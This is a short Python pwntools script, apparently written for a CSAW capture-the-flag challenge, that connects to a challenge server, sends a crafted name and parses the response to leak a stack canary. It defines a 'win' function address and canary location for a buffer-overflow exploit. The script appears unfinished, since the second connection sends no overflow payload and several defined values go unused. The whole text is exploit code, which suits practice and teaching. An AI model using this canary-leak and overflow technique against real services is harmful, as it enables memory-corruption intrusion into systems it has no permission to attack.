#!/usr/bin/env python3

from pwn import *

url = 'pwn.red.csaw.io'
port = 5005

win = p32(0x080486a6)
canary_loc = 0x0804a06c

name = b'A'*32

def getcanary():
    conn = remote(url,port)
    
    print(conn.recv())
    
    print(str(len(name)).encode())
    conn.sendline(str(len(name)).encode())
    
    print(conn.recv())
    
    print(name)
    conn.send(name)
    
    answer = conn.recv()
    print(answer)
    canary = answer.split(name)[-1][:8]
    print('canary: ',canary)
    
    conn.close()

    return canary
    
canary = getcanary()
print(canary)

conn = remote(url, port)

conn.interactive()

conn.close()
